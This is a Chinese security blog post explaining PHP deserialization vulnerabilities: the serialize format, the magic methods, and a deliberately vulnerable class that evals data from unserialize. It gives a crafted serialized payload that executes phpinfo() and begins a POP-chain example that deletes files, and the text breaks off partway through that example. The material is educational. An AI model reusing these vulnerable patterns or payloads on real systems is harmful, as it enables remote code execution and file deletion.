<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.1","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="反序列化漏洞  原理：反序列化漏洞是基于序列化和反序列化的操作，在反序列化——unserialize()时存在用户可控参数，而反序列化会自动调用一些魔术方法，如果魔术方法内存在一些敏感操作例如eval()函数，而且参数是通过反序列化产生的，那么用户就可以通过改变参数来执行敏感操作，这就是反序列化漏洞。没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码恶意执行等一系">
<meta property="og:type" content="article">
<meta property="og:title" content="反序列化漏洞">
<meta property="og:url" content="http://example.com/2024/11/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Xorb_7&#39;s Blog">
<meta property="og:description" content="反序列化漏洞  原理：反序列化漏洞是基于序列化和反序列化的操作，在反序列化——unserialize()时存在用户可控参数，而反序列化会自动调用一些魔术方法，如果魔术方法内存在一些敏感操作例如eval()函数，而且参数是通过反序列化产生的，那么用户就可以通过改变参数来执行敏感操作，这就是反序列化漏洞。没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码恶意执行等一系">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/7.jpg">
<meta property="article:published_time" content="2024-11-17T16:11:46.000Z">
<meta property="article:modified_time" content="2024-11-23T16:14:08.831Z">
<meta property="article:author" content="Xorb_7">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/7.jpg">


<link rel="canonical" href="http://example.com/2024/11/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/11/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","path":"2024/11/18/反序列化/","title":"反序列化漏洞"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>反序列化漏洞 | Xorb_7's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Xorb_7's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-link"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.1.</span> <span class="nav-text">序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#serialize%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.1.</span> <span class="nav-text">serialize函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NULL%E5%92%8C%E6%A0%87%E9%87%8F%E7%B1%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.1.2.</span> <span class="nav-text">NULL和标量类型数据的序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E5%A4%8D%E5%90%88%E7%B1%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.1.3.</span> <span class="nav-text">简单复合类型数据的序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.2.</span> <span class="nav-text">反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.1.</span> <span class="nav-text">反序列化漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">魔法函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#construct%E5%87%BD%E6%95%B0%E5%92%8C-destruct%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">_ _construct函数和 _ _destruct函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sleep%E5%87%BD%E6%95%B0%E5%92%8C-wakeup%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">_ _sleep函数和 _ _wakeup函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.2.2.</span> <span class="nav-text">反序列化漏洞示例代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%AE%9E%E4%BE%8B"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">漏洞原理实例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">漏洞检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POP-CHAIN-POP%E9%93%BE-%EF%BC%9A"><span class="nav-number">1.2.2.5.</span> <span class="nav-text">POP CHAIN(POP链)：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5%EF%BC%9A"><span class="nav-number">1.2.2.5.1.</span> <span class="nav-text">概念：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E8%A7%A3%E6%9E%901%EF%BC%9A"><span class="nav-number">1.2.2.5.2.</span> <span class="nav-text">实例解析1：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E8%A7%A3%E6%9E%902%EF%BC%9A"><span class="nav-number">1.2.2.5.3.</span> <span class="nav-text">实例解析2：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Xorb_7"
      src="https://avatars.githubusercontent.com/u/95856889?s=400&u=aa80da11fcc14ae3054ecbbbe19ee819f8024678&v=4">
  <p class="site-author-name" itemprop="name">Xorb_7</p>
  <div class="site-description" itemprop="description"><font color="#FFFFFF">答案都在路上，自由都在风里...</font></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">9</span>
          <span class="site-state-item-name">笔记</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/baqcDevil" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baqcDevil" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:aimee.lrq@gmail.com" title="E-Mail → mailto:aimee.lrq@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/95856889?s=400&u=aa80da11fcc14ae3054ecbbbe19ee819f8024678&v=4">
      <meta itemprop="name" content="Xorb_7">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xorb_7's Blog">
      <meta itemprop="description" content="<font color="#FFFFFF">答案都在路上，自由都在风里...</font>">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="反序列化漏洞 | Xorb_7's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          反序列化漏洞
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-11-18 00:11:46" itemprop="dateCreated datePublished" datetime="2024-11-18T00:11:46+08:00">2024-11-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-11-24 00:14:08" itemprop="dateModified" datetime="2024-11-24T00:14:08+08:00">2024-11-24</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p><img src="/img/7.jpg" alt="7"></p>
<blockquote>
<p><strong>原理：反序列化漏洞是基于序列化和反序列化的操作，在反序列化——unserialize()时存在用户可控参数，而反序列化会自动调用一些魔术方法，如果魔术方法内存在一些敏感操作例如eval()函数，而且参数是通过反序列化产生的，那么用户就可以通过改变参数来执行敏感操作，这就是反序列化漏洞。没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码恶意执行等一系列不可控的结果</strong></p>
</blockquote>
<span id="more"></span>

<p>PHP中常见的序列化和反序列化函数有serialize、unserialize、json_encode和json_decode</p>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><h3 id="serialize函数"><a href="#serialize函数" class="headerlink" title="serialize函数"></a>serialize函数</h3><p>序列化函数，当序列化对象时，PHP在序列化动作之前调用该对象的成员函数_sleep，这样就允许对象在序列化之前做任何清除操作</p>
<h3 id="NULL和标量类型数据的序列化"><a href="#NULL和标量类型数据的序列化" class="headerlink" title="NULL和标量类型数据的序列化"></a>NULL和标量类型数据的序列化</h3><p>最简单的，也是构成复合类型序列化的基础</p>
<p><strong>1.NULL的序列化</strong></p>
<p>在PHP中，NULL被序列化为N</p>
<p><strong>2.boolean型数据的序列化</strong></p>
<p>boolean型数据被序列化为b:<digit>。其中<gigit>表示0或1，数据为false，表示为0，反之</p>
<p><strong>3.integer型数据的序列化</strong></p>
<p>integer型数据被序列化i:<number>。其中，<number>为一个整型数。如果被序列化数字超过范围，被序列化为浮点型，如果序列化后的数字超过范围，则反序列化时不会返回期望的数值</p>
<p><strong>4.double型数据的序列化</strong></p>
<p>double型数据的序列化为d:<number>。如果序列化无穷大，<number>为INF，如果序列化负无穷大，<number>为-INF。如果序列化后数字超过PHP能表示的最大值，则反序列化时返回无穷大（INF），如果序列化后数字小于PHP能表示的最小精度，则反序列化时返回0。如果被序列化的数据为非数据，被序列化为NAN，NAN反序列化时返回0</p>
<p><strong>5.string型数据的序列化</strong></p>
<p>string型数据被序列化为s:<length>:”<value>“</p>
<h3 id="简单复合类型数据的序列化"><a href="#简单复合类型数据的序列化" class="headerlink" title="简单复合类型数据的序列化"></a>简单复合类型数据的序列化</h3><p>PHP中的复合类型有数组和对象两种</p>
<p><strong>1.数组的序列化</strong></p>
<p>数组通常被序列化为a:<n>:{&lt;key 1&gt;&lt;value 1&gt;&lt;key 2&gt;&lt;value 2&gt;….<key n><value n>}</p>
<p><strong>2.对象的序列化</strong></p>
<p>对象通常被序列化为o:<length>“<class name>“:<n>:{&lt;field name 1&gt;&lt;field value 1&gt;&lt;field name 2&gt;&lt;field value 2&gt;…<field name n><field value n>}</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>unserialize是反序列化函数，若被序列化的变量是一个对象，再重新构造对象后，会自动调用_wakeup成员函数</p>
<h3 id="反序列化漏洞利用"><a href="#反序列化漏洞利用" class="headerlink" title="反序列化漏洞利用"></a>反序列化漏洞利用</h3><p><strong>反序列化漏洞产生的主要原因：unserialize函数的参数可控；存在魔法函数</strong></p>
<h4 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()  当创建对象时触发，一般用于初始化对象，对变量赋初值</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()      使用<span class="title function_ invoke__">serialize</span>()时自动触发 </span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()     使用<span class="title function_ invoke__">unserialize</span>()时自动触发</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()   当一个对象被销毁时触发</span><br><span class="line"><span class="title function_ invoke__">__toString</span>()   当一个类被当成字符串使用时触发</span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()     当尝试以调用函数的方式调用一个对象时触发</span><br><span class="line"><span class="title function_ invoke__">__call</span>()       在对象上下文中调用不可访问的方法时触发 </span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() 在静态上下文中调用不可访问的方法时触发 </span><br><span class="line"><span class="title function_ invoke__">__get</span>()        用于从不可访问的属性读取数据</span><br><span class="line"><span class="title function_ invoke__">__set</span>()        用于将数据写入不可访问的属性</span><br><span class="line"><span class="title function_ invoke__">__isset</span>()      在不可访问的属性上调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()触发</span><br><span class="line"><span class="title function_ invoke__">__unset</span>()      在不可访问的属性上使用<span class="keyword">unset</span>()时触发</span><br></pre></td></tr></table></figure>

<p>PHP将所有以_ _开头的函数保留为魔法函数，所以定义类方法时不要以 _ _为前缀</p>
<h4 id="construct函数和-destruct函数"><a href="#construct函数和-destruct函数" class="headerlink" title="_ _construct函数和 _ _destruct函数"></a>_ _construct函数和 _ _destruct函数</h4><p><strong>1._ _construct函数</strong></p>
<p>用法：void _ _construct([mixed $args[,$…]])</p>
<p>具有构造函数的类会在每次创建新对象时先调用此方法，所以_ _construct函数非常适合在使用对象前做一些初始化工作</p>
<p><strong>2._ _destruct函数</strong></p>
<p>用法：void _ _destruct(void)</p>
<p>构造函数会在对某个对象的所有引用都被删除或者对象被显式销毁时执行</p>
<h4 id="sleep函数和-wakeup函数"><a href="#sleep函数和-wakeup函数" class="headerlink" title="_ _sleep函数和 _ _wakeup函数"></a>_ _sleep函数和 _ _wakeup函数</h4><p><strong>1._ _sleep函数</strong></p>
<p>serialize函数会检查类中是否存在_ _sleep函数，若存在，该函数会先被调用，然后执行序列化操作。可用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组，若该函数未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误</p>
<p>_ _sleep函数不能返回父类私有成员的名字，产生一个E_NOTICE级别的错误，该函数可用serializable接口来替代</p>
<p>_ _sleep函数和常用于提交未提交的数据或进行类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，则使用此功能较好</p>
<p><strong>2._ _wakeup函数</strong></p>
<p>unserialize函数会检查是否存在_ _wakeup函数，如果存在，则会先调用 _ _wakeup函数，预先准备对象需要的资源</p>
<p>_ _wakeup函数常用在反序列化操作中，可重新建立数据库连接或执行其他初始化操作</p>
<h3 id="反序列化漏洞示例代码分析"><a href="#反序列化漏洞示例代码分析" class="headerlink" title="反序列化漏洞示例代码分析"></a>反序列化漏洞示例代码分析</h3><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>首先判断有无GET型数据</p>
<p>如果传入了GET型数据，unserialize函数首先会检查有无_ _wakeup函数。调用 _ _destruct函数，在此函数中判断是否传入参数，根据参数看执行什么</p>
<p>如果没有传入GET型数据，会创建对象传入什么参数。创建新对象时，先调用_ _construct函数，再看有没有调用其他函数，最后调用 _ _destruct函数</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>反序列化漏洞的发现一般需审计源码，寻找可利用的pop链</strong></p>
<h4 id="漏洞原理实例"><a href="#漏洞原理实例" class="headerlink" title="漏洞原理实例"></a>漏洞原理实例</h4><p><strong>在反序列化时，参数用户可控，魔术方法中存在危害函数，就会产生反序列化漏洞，下面给出一个最简单的实例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line"></span><br><span class="line">class test&#123;</span><br><span class="line"></span><br><span class="line">    var $id = &#x27;Baize&#x27;;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        eval($this-&gt;id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test1 = $_GET[&#x27;string&#x27;];</span><br><span class="line"></span><br><span class="line">$test2 = unserialize($test1);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>审计代码，总结如下</strong></p>
<p>1.可控参数是GET型string参数</p>
<p>2.后端接收参数后进行反序列化操作</p>
<p>3.test类中存在__wakeup魔术方法，操作是eval($id)</p>
<p>那么我们思路是：构造test类的序列化字符串，使得反序列化后得$id值为要执行的操作，例如我们要执行phpinfo()，那么可以构造这样一个字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:2:&quot;id&quot;;s:10:&quot;phpinfo();&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>在反序列化后会重新创建该对象test，并且id参数会恢复为我们提交的序列化参数中设定的值，即phpinfo(); ，那么我们可以推理出反序列化之后的test对象大致如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line"></span><br><span class="line">class test&#123;</span><br><span class="line"></span><br><span class="line">    var $id = &#x27;phpinfo();&#x27;;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        eval($this-&gt;id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>而反序列化会时会自动调用__wakeup魔术方法，即执行<code>eval(phpinfo();)</code></p>
<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><p>上面的例子为了让大家理解，较为简单，直接在魔术方法中就有可以利用的漏洞，自动调用魔术方法从而触发漏洞，而实际中基本不会有这种这么简单的，更多的则是需要通过寻找相同的函数名将类的属性和敏感函数的属性联系起来</p>
<p>下面我们就通过两道简单的题目来学习构造简单的pop链来利用反序列化漏洞</p>
<h4 id="POP-CHAIN-POP链-："><a href="#POP-CHAIN-POP链-：" class="headerlink" title="POP CHAIN(POP链)："></a>POP CHAIN(POP链)：</h4><h5 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h5><p>通过用户可控的反序列化操作，其中可触发的魔术方法为出发点，在魔术方法中的函数在其他类中存在同名函数，或通过传递，关联等可以调用的其他执行敏感操作的函数，然后传递参数执行敏感操作，即</p>
<p><strong>用户可控反序列化→魔术方法→魔术方法中调用的其他函数→同名函数或通过传递可调用的函数→敏感操作</strong></p>
<h5 id="实例解析1："><a href="#实例解析1：" class="headerlink" title="实例解析1："></a>实例解析1：</h5><p><strong>源码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Test1&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;obj = new Test3;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __toString()&#123;</span><br><span class="line"></span><br><span class="line">        if (isset($this-&gt;obj)) return $this-&gt;obj-&gt;Delete();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test2&#123;  </span><br><span class="line">    public $cache_file;</span><br><span class="line"></span><br><span class="line">    function Delete()&#123;</span><br><span class="line">        $file = “/var/www/html/cache/tmp/&#123;$this-&gt;cache_file&#125;”;</span><br><span class="line"></span><br><span class="line">        if (file_exists($file))&#123;</span><br><span class="line"></span><br><span class="line">            @unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &#x27;I am a evil Delete function&#x27;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test3&#123;</span><br><span class="line"></span><br><span class="line">    function Delete()&#123;</span><br><span class="line"></span><br><span class="line">        return &#x27;I am a safe Delete function&#x27;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_data = unserialize($_GET[&#x27;data&#x27;]);</span><br><span class="line"></span><br><span class="line">echo $user_data;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>代码分析：</strong></p>
<p>首先我们看最限制行的操作在最下面反序列化GET到的参数data，然后执行echo $user_data，这里如果$user*data是一个类实例化来的对象的话，就会触发对象中的*_tostring()魔术方法</p>
<p>其次源码中有三个类，分别是Test1，Test2，Test3，依次分析</p>
<p><strong>Test1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Test1&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;obj = new Test3;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __toString()&#123;</span><br><span class="line"></span><br><span class="line">        if (isset($this-&gt;obj)) return $this-&gt;obj-&gt;Delete();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.首先声明了$obj变量</p>
<p>2.类中有__construct()和__tostring()魔术方法，__construct()方法为$obj变量赋值为Test3类的实例化对象，__tostring()方法判断如果$obj变量存在则返回调用$obj对象中的Delete()函数</p>
<p><strong>Test2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Test2&#123;  </span><br><span class="line">    public $cache_file;</span><br><span class="line"></span><br><span class="line">    function Delete()&#123;</span><br><span class="line">        $file = “/var/www/html/cache/tmp/&#123;$this-&gt;cache_file&#125;”;</span><br><span class="line"></span><br><span class="line">        if 